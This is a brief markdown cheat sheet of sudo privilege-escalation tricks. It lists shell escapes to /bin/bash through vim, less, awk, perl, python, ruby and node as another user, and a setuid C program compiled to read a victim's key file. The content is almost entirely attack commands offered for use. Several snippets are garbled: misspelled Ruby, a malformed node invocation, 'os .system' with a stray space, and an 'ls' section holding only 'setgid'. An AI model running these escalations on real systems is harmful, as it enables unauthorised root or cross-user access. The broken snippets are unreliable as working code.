# Bypassing sudo

List privileges
```bash
sudo -l
```

Change user
```bash
sudo -u [username] [command]
```

## vim
```bash
sudo -u [username] vim
	:r [path file]
	:!/bin/bash/ 
```

## less
```bash
sudo -u [username] less [path file]
	:e [path file]
	:!/bin/bash  
```

## awk
```bash
sudo -u [username] awk '{print $1}' [path file]
```

```bash
sudo -u [username] awk 'BEGIN {system("/bin/bash")}'
```
## ls
```bash
setgid
```

```c
int main(void) {
	system("cat /home/victim/key.txt");
}
```

```bash
gcc -o /tmp/[file] [file].c
chmod +xs [file]
```

## perl
```perl
sudo -u [victim] perl -e '`/bin/bash`'
```

## python
```python
from subprocess import call
call(['command','path'])

import os 
os .system('/bin/bash')
```

## ruby
```ruby
sudo -u [user] ruby -e 'puts `id`'
sudo -u [user] ruby -e 'requiereputs "id"; IRB.start(__FILE___)'
```

## nodejs
```bash
sudo -u [user] -e node ''
var exec = require("child_process").exec;
exec("[COMMAND]", function (error, stdOut, stdErr) {
console.log(stdOut);
});
```
